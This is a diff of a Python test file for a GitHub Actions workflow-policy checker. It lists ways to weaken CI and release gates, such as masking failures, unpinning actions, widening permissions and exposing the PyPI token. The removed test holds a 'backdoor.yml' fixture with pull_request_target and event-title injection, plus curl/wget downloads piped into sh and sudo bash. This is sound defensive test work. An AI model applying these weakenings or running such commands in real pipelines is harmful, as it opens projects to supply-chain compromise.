@@ -19,14 +19,18 @@ def test_release_metadata_matches_package_version_and_supported_pythons():
     assert 'requires-python = ">=3.10"' in pyproject
     assert 'requires = ["hatchling>=1.32,<1.33"]' in pyproject
     assert "dependencies =" not in pyproject
-    assert 'dev = ["pytest", "ruff==0.16.4", "mypy==2.3.1"]' in pyproject
+    assert (
+        'dev = ["pytest", "PyYAML==6.0.3", "ruff==0.16.4", "mypy==2.3.1"]'
+        in pyproject
+    )
 
 
 def _workflow_texts() -> dict[str, str]:
     directory = ROOT / ".github" / "workflows"
     return {
-        name: (directory / name).read_text(encoding="utf-8")
-        for name in ("quality.yml", "ci.yml", "release.yml")
+        path.name: path.read_text(encoding="utf-8")
+        for path in directory.iterdir()
+        if path.suffix.lower() in (".yml", ".yaml")
     }
 
 
@@ -36,165 +40,174 @@ def test_reusable_quality_gate_controls_ci_and_release():
     assert "* text=auto eol=lf" in attributes
 
 
-def test_workflow_policy_rejects_meaningful_gate_weakening():
-    originals = _workflow_texts()
-    mutations = [
-        (
-            "quality.yml",
-            "os: [ubuntu-latest, macos-latest, windows-latest]",
-            "os: [ubuntu-latest, macos-latest]",
-        ),
-        (
-            "quality.yml",
-            'python-version: ["3.10", "3.11", "3.12", "3.13", "3.14"]',
-            'python-version: ["3.11", "3.12", "3.13", "3.14"]',
-        ),
-        ("quality.yml", "needs: [test, static]", "needs: []"),
-        ("quality.yml", "needs: [test, static]", "needs: test"),
-        ("quality.yml", "needs: [test, static]", "needs: [static]"),
-        ("quality.yml", "needs: [test, static]", "needs: [static, test]"),
-        # The static gate: removed, reordered, conditional, softened, moved
-        # off Linux/3.10, or narrowed to a subset of the package.
-        ("quality.yml", "      - run: uv run --locked ruff check .\n", ""),
-        ("quality.yml", "      - run: uv run --locked mypy glossabet\n", ""),
-        ("quality.yml", "      - run: uv run --locked mypy glossabet",
-         "      - run: uv run --locked mypy glossabet/cli.py"),
-        ("quality.yml", "      - run: uv run --locked ruff check .",
-         "      - run: uv run --locked ruff check glossabet"),
-        ("quality.yml", "      - run: uv run --locked ruff check .",
-         "      - run: uv run --locked ruff check . || true"),
-        ("quality.yml", "      - run: uv run --locked mypy glossabet",
-         "      - run: uv run --locked mypy glossabet\n        continue-on-error: true"),
-        ("quality.yml", "      - run: uv run --locked mypy glossabet",
-         "      - run: uv run --locked mypy glossabet\n        if: false"),
-        ("quality.yml", "  static:\n    name: Ruff and mypy on Python 3.10\n",
-         "  static:\n    if: false\n    name: Ruff and mypy on Python 3.10\n"),
-        ("quality.yml", "  static:\n    name: Ruff and mypy on Python 3.10\n    runs-on: ubuntu-latest",
-         "  static:\n    name: Ruff and mypy on Python 3.10\n    runs-on: windows-latest"),
-        ("quality.yml", '          python-version: "3.10"\n      - uses: astral-sh/setup-uv',
-         '          python-version: "3.14"\n      - uses: astral-sh/setup-uv'),
-        ("quality.yml", '      - run: uv sync --locked --python "3.10"\n',
-         '      - run: uv sync --python "3.10"\n'),
-        (
-            "ci.yml",
-            "uses: ./.github/workflows/quality.yml",
-            "uses: ./.github/workflows/bypass.yml",
-        ),
-        (
-            "release.yml",
-            "uses: ./.github/workflows/quality.yml",
-            "uses: ./.github/workflows/bypass.yml",
-        ),
-        ("release.yml", "needs: quality", "needs: []"),
-        (
-            "release.yml",
-            "inputs.confirmation == 'publish-glossabet-to-pypi'",
-            "inputs.confirmation != ''",
-        ),
-        (
-            "release.yml",
-            "python evaluation/run.py --verify-results evaluation/results.json --current",
-            "python -c pass",
-        ),
-        (
-            "quality.yml",
-            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
-            "python -c pass",
-        ),
-        (
-            "release.yml",
-            "python evaluation/review.py --verify-results evaluation/reviewer-results.json --current",
-            "python -c pass",
-        ),
-        (
-            "release.yml",
-            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json --current",
-            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
-        ),
-        (
-            "quality.yml",
-            "python scripts/build_plugin.py dist",
-            "python -c pass",
-        ),
-        (
-            "release.yml",
-            "git diff --exit-code -- plugins/glossabet",
-            "git status --short",
-        ),
-        (
-            "release.yml",
-            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG" --current',
-            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG"',
-        ),
-        (
-            "release.yml",
-            "python scripts/build_plugin.py dist",
-            "python -c pass",
-        ),
-        (
-            "release.yml",
-            "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
-            "pypa/gh-action-pypi-publish@v1",
-        ),
-        # The peripheral rules a test-audit found unpinned: each is a way
-        # the gate could be widened or the release made non-manual.
-        ("quality.yml", "on:\n  workflow_call:", "on:\n  workflow_call:\n  push:"),
-        ("quality.yml", "on:\n  workflow_call:", "on:\n  push:"),
-        ("quality.yml", "      fail-fast: false", "      fail-fast: true"),
-        ("quality.yml", "      - run: python scripts/check_workflows.py",
-         "      - run: python scripts/check_workflows.py --current"),
-        ("ci.yml", "    uses: ./.github/workflows/quality.yml",
-         "    uses: ./.github/workflows/quality.yml\n    run: echo shortcut"),
-        ("release.yml", "on:\n  workflow_dispatch:", "on:\n  push:\n  workflow_dispatch:"),
-        ("release.yml", "on:\n  workflow_dispatch:", "on:\n  push:"),
-        ("release.yml", "  quality:\n    uses: ./.github/workflows/quality.yml",
-         "  quality:\n    if: false\n    uses: ./.github/workflows/quality.yml"),
-        ("release.yml", "      id-token: write", "      id-token: write\n      packages: write"),
-        ("release.yml", "    permissions:\n      contents: read\n      id-token: write",
-         "    permissions: write-all"),
-        ("release.yml", "  publish:\n    needs: quality",
-         "  publish:\n    needs: quality\n    env:\n      TOKEN: ${{ secrets.PYPI_TOKEN }}"),
-        ("release.yml", "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33 # v1.14.2\n",
-         "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33 # v1.14.2\n"
-         "  extra:\n    runs-on: ubuntu-latest\n    steps: []\n"),
-        ("ci.yml", "    uses: ./.github/workflows/quality.yml\n",
-         "    uses: ./.github/workflows/quality.yml\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n"),
-        ("release.yml", "on:\n  workflow_dispatch:\n    inputs:\n      confirmation:\n        description: Type publish-glossabet-to-pypi to authorize the public upload\n        required: true\n        type: string\n",
-         "on: {}\n"),
-        ("quality.yml", "\n  package:\n",
-         "\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n  package:\n"),
-        ("release.yml", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
-         "      - uses: "),
-        # A required step present as text but inert: its failure discarded
-        # by a shell softener, by continue-on-error, or by a step-level if.
-        ("quality.yml", "      - run: uv run --locked pytest -q",
-         "      - run: uv run --locked pytest -q || true"),
-        ("quality.yml", "      - run: uv run --locked pytest -q",
-         "      - run: uv run --locked pytest -q || exit 0"),
-        ("quality.yml", "      - run: uv run --locked pytest -q",
-         "      - run: uv run --locked pytest -q || :"),
-        ("quality.yml", "      - run: uv run --locked pytest -q",
-         "      - run: |\n          set +e\n          uv run --locked pytest -q"),
-        ("quality.yml", "      - run: uv run --locked pytest -q",
-         "      - run: uv run --locked pytest -q\n        continue-on-error: true"),
-        ("quality.yml", "      - run: uv run --locked pytest -q",
-         "      - run: uv run --locked pytest -q\n        if: false"),
-        ("release.yml", "      - run: python scripts/wheel_smoke.py dist",
-         "      - run: python scripts/wheel_smoke.py dist\n        continue-on-error: true"),
-        # A stored secret reachable by every job through a top-level env.
-        ("release.yml", "permissions:\n  contents: read\n",
-         "env:\n  TOKEN: ${{ secrets.PYPI_TOKEN }}\npermissions:\n  contents: read\n"),
-    ]
+WEAKENINGS = [
+    ("quality.yml", '"on":\n  workflow_call:', '"on":\n  push:'),
+    ("quality.yml", "permissions:\n  contents: read", "permissions: write-all"),
+    (
+        "quality.yml",
+        "\n  package:\n",
+        "\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n  package:\n",
+    ),
+    ("quality.yml", "  test:\n    name:", "  test:\n    if: false\n    name:"),
+    (
+        "quality.yml",
+        "os: [ubuntu-latest, macos-latest, windows-latest]",
+        "os: [ubuntu-latest, macos-latest]",
+    ),
+    (
+        "quality.yml",
+        'python-version: ["3.10", "3.11", "3.12", "3.13", "3.14"]',
+        'python-version: ["3.11", "3.12", "3.13", "3.14"]',
+    ),
+    ("quality.yml", "fail-fast: false", "fail-fast: true"),
+    (
+        "quality.yml",
+        "runs-on: ${{ matrix.os }}",
+        "runs-on: ubuntu-latest",
+    ),
+    (
+        "quality.yml",
+        "uv sync --locked --python ${{ matrix.python-version }}",
+        "uv sync --python ${{ matrix.python-version }}",
+    ),
+    ("quality.yml", "uv run --locked pytest -q", "pytest -q"),
+    (
+        "quality.yml",
+        "  static:\n    name: Ruff and mypy on Python 3.10\n    runs-on: ubuntu-latest",
+        "  static:\n    name: Ruff and mypy on Python 3.10\n    runs-on: windows-latest",
+    ),
+    (
+        "quality.yml",
+        "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e",
+        "actions/setup-go@v7",
+    ),
+    ("quality.yml", 'go-version: "1.25.x"', 'go-version: "stable"'),
+    (
+        "quality.yml",
+        "go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12",
+        "go install github.com/rhysd/actionlint/cmd/actionlint@latest",
+    ),
+    ("quality.yml", "      - run: actionlint\n", ""),
+    ("quality.yml", "uv run --locked ruff check .", "uv run --locked ruff check glossabet"),
+    (
+        "quality.yml",
+        "uv run --locked mypy glossabet",
+        "uv run --locked mypy glossabet/cli.py",
+    ),
+    ("quality.yml", "needs: [test, static]", "needs: [static]"),
+    ("quality.yml", "python scripts/check_workflows.py", "python -c pass"),
+    (
+        "quality.yml",
+        "python evaluation/run.py --verify-results evaluation/results.json",
+        "python -c pass",
+    ),
+    (
+        "quality.yml",
+        "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
+        "python -c pass",
+    ),
+    (
+        "quality.yml",
+        "python evaluation/review.py --verify-results evaluation/reviewer-results.json",
+        "python -c pass",
+    ),
+    ("quality.yml", "uv build --no-sources --clear", "uv build"),
+    ("quality.yml", "python scripts/build_plugin.py dist", "python -c pass"),
+    ("quality.yml", "python scripts/check_distribution.py dist", "python -c pass"),
+    ("quality.yml", "python scripts/wheel_smoke.py dist", "python -c pass"),
+    (
+        "ci.yml",
+        '"on":\n  push:\n  pull_request:',
+        '"on":\n  push:',
+    ),
+    (
+        "ci.yml",
+        "uses: ./.github/workflows/quality.yml",
+        "uses: ./.github/workflows/bypass.yml",
+    ),
+    (
+        "release.yml",
+        '"on":\n  workflow_dispatch:',
+        '"on":\n  push:\n  workflow_dispatch:',
+    ),
+    ("release.yml", "required: true", "required: false"),
+    (
+        "release.yml",
+        "  quality:\n    uses: ./.github/workflows/quality.yml",
+        "  quality:\n    if: false\n    uses: ./.github/workflows/quality.yml",
+    ),
+    ("release.yml", "needs: quality", "needs: []"),
+    ("release.yml", "github.ref_type == 'tag'", "github.ref_type == 'branch'"),
+    (
+        "release.yml",
+        "startsWith(github.ref_name, 'v')",
+        "github.ref_name != ''",
+    ),
+    (
+        "release.yml",
+        "inputs.confirmation == 'publish-glossabet-to-pypi'",
+        "inputs.confirmation != ''",
+    ),
+    ("release.yml", "      name: pypi", "      name: staging"),
+    (
+        "release.yml",
+        "      id-token: write",
+        "      id-token: write\n      packages: write",
+    ),
+    (
+        "release.yml",
+        "persist-credentials: false",
+        "persist-credentials: true",
+    ),
+    (
+        "release.yml",
+        "python scripts/wheel_smoke.py dist",
+        "python scripts/wheel_smoke.py dist\n        continue-on-error: true",
+    ),
+    (
+        "release.yml",
+        '--tag "$RELEASE_TAG" --current',
+        '--tag "${{ github.ref_name }}" --current',
+    ),
+    (
+        "release.yml",
+        "dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
+        "v1",
+    ),
+    (
+        "release.yml",
+        "  publish:\n    needs: quality",
+        "  publish:\n    needs: quality\n    env:\n      TOKEN: ${{ secrets.PYPI_TOKEN }}",
+    ),
+]
 
-    for filename, original, weakened in mutations:
-        assert original in originals[filename]
-        workflows = dict(originals)
-        workflows[filename] = workflows[filename].replace(
-            original, weakened, 1
-        )
-        assert validate_workflow_texts(workflows), (
-            f"workflow policy accepted weakening in {filename}: {weakened}"
-        )
+
+@pytest.mark.parametrize("filename, original, weakened", WEAKENINGS)
+def test_workflow_policy_rejects_each_project_gate(filename, original, weakened):
+    workflows = _workflow_texts()
+    assert original in workflows[filename]
+    workflows[filename] = workflows[filename].replace(original, weakened, 1)
+    assert validate_workflow_texts(workflows), (
+        f"workflow policy accepted weakening in {filename}: {weakened}"
+    )
+
+
+def test_workflow_policy_reports_invalid_yaml():
+    workflows = _workflow_texts()
+    workflows["quality.yml"] = '"on": [\njobs: {}\n'
+    errors = validate_workflow_texts(workflows)
+    assert any("quality.yml is invalid YAML" in error for error in errors)
+
+
+def test_workflow_policy_checks_new_workflow_files(tmp_path):
+    for name, text in _workflow_texts().items():
+        (tmp_path / name).write_text(text, encoding="utf-8")
+    (tmp_path / "extra.yml").write_text(
+        '"on": {push: null}\njobs:\n  extra:\n    runs-on: ubuntu-latest\n'
+        "    steps:\n      - uses: actions/checkout@v7\n",
+        encoding="utf-8",
+    )
+    assert any("unpinned action" in error for error in check_workflows(tmp_path))
 
 
 def test_distribution_content_guard_catches_local_home_paths():
@@ -214,115 +227,6 @@ def test_distribution_content_guard_catches_local_home_paths():
     assert not _LOCAL_PATH_RE.search(b"/usr/" + b"roo" + b"t/share")
     # the guard's own pattern source must not be a self-match
     assert not _LOCAL_PATH_RE.search(b"(?:/home/|/Users/)[literal]")
-
-
-def test_workflow_policy_ignores_comments_and_checks_every_workflow_file(tmp_path):
-    """The checker was a substring matcher: every required step present only
-    inside `#` comments passed, an unpinned action or `pull_request_target`
-    in a fourth file was never read, and an expression interpolated into a
-    shell line went unnoticed. Comments are stripped first, every file in
-    the directory is held to the global rules, and the publish job's tag must
-    arrive through `env:`."""
-    from scripts.check_workflows import check_workflows, validate_workflow_texts
-
-    workflows = {
-        path.name: path.read_text(encoding="utf-8")
-        for path in (ROOT / ".github" / "workflows").iterdir()
-        if path.suffix == ".yml"
-    }
-    assert validate_workflow_texts(workflows) == []
-
-    # Guards and steps moved into comments no longer satisfy the checker.
-    commented = dict(workflows)
-    commented["release.yml"] = "\n".join(
-        ("# " + line if "startsWith(github.ref_name, 'v')" in line else line)
-        for line in workflows["release.yml"].splitlines()
-    )
-    assert any("publish guard is missing" in e for e in validate_workflow_texts(commented))
-
-    # Interpolating the tag straight into the shell line is refused.
-    inline = dict(workflows)
-    inline["release.yml"] = workflows["release.yml"].replace(
-        '--tag "$RELEASE_TAG"', '--tag "${{ github.ref_name }}"'
-    )
-    assert any("untrusted expression outside env:/if:" in e for e in validate_workflow_texts(inline))
-
-    # A fourth workflow file is read: fork-PR trigger, tag-pinned action, and
-    # an event expression in a run line are all reported.
-    extra = dict(workflows)
-    extra["backdoor.yml"] = (
-        "on:\n  pull_request_target:\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
-        "    steps:\n      - uses: actions/checkout@v4\n"
-        "      - run: echo ${{ github.event.pull_request.title }}\n"
-        "      - run: curl -sSf https://x/install.sh | sh\n"
-    )
-    errors = validate_workflow_texts(extra)
-    assert any("pull_request_target" in e for e in errors)
-    assert any("unpinned action" in e for e in errors)
-    assert any("untrusted expression" in e for e in errors)
-    assert any("pipes a download" in e for e in errors)
-
-    # The bypasses a fix-review found against the first hardening: an
-    # expression on line 2 of a `run: |` block, a `#` inside a quoted string
-    # before the expression, list/flow/bare spellings of the fork trigger, a
-    # `uses:` target on a continuation line, and dropped publish hardening.
-    for text, expected in (
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - run: |\n          echo hi\n          echo ${{ github.event.issue.title }}\n",
-         "untrusted expression"),
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - run: echo \"a #\" ${{ github.event.issue.title }}\n",
-         "untrusted expression"),
-        ("on: [pull_request_target]\njobs: {}\n", "pull_request_target"),
-        ("on: pull_request_target\njobs: {}\n", "pull_request_target"),
-        ("on: {pull_request_target: {}}\njobs: {}\n", "pull_request_target"),
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - uses:\n          actions/checkout@v4\n", "unpinned action"),
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - uses: actions/github-script@0123456789abcdef0123456789abcdef01234567\n"
-         "        with:\n          script: return context.payload.pull_request.title\n"
-         "      - uses: x/y@0123456789abcdef0123456789abcdef01234567\n"
-         "        with:\n          arg: ${{ github.event.pull_request.title }}\n",
-         "untrusted expression"),
-        # Wrapped in a function call, the value is still the attacker's.
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - run: echo ${{ toJSON(github.event.pull_request) }}\n",
-         "untrusted expression"),
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - run: echo ${{ format('{0}', inputs.name) }}\n",
-         "untrusted expression"),
-        # The whole event object (title, body, branch names inside).
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - uses: x/y@0123456789abcdef0123456789abcdef01234567\n"
-         "        with:\n          a: ${{ toJSON(github.event) }}\n",
-         "untrusted expression"),
-        # A download piped through sudo or env into a shell.
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - run: curl -sSf https://x/i.sh | sudo bash\n", "pipes a download"),
-        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
-         "      - run: wget -qO- https://x/i.sh | env FOO=1 sh -s\n", "pipes a download"),
-        # A stored secret in any workflow, at any level.
-        ("on: push\nenv:\n  T: ${{ secrets.TOKEN }}\njobs: {}\n", "stored secret"),
-    ):
-        variant = dict(workflows)
-        variant["extra.yml"] = text
-        assert any(expected in e for e in validate_workflow_texts(variant)), (expected, text)
-    weakened = dict(workflows)
-    weakened["release.yml"] = workflows["release.yml"].replace(
-        "          persist-credentials: false\n", ""
-    )
-    assert any("persist credentials" in e for e in validate_workflow_texts(weakened))
-    weakened["release.yml"] = workflows["release.yml"].replace(
-        "      id-token: write\n", "      id-token: write\n      packages: write\n"
-    )
-    assert any("not exactly contents: read" in e for e in validate_workflow_texts(weakened))
-
-    # And check_workflows() reads the whole directory, not three fixed names.
-    for name, text in extra.items():
-        (tmp_path / name).write_text(text, encoding="utf-8")
-    assert check_workflows(tmp_path)
-    (tmp_path / "backdoor.yml").unlink()
-    assert check_workflows(tmp_path) == []
 
 
 def test_distribution_home_path_scan_reaches_every_archive_layer(tmp_path, monkeypatch):
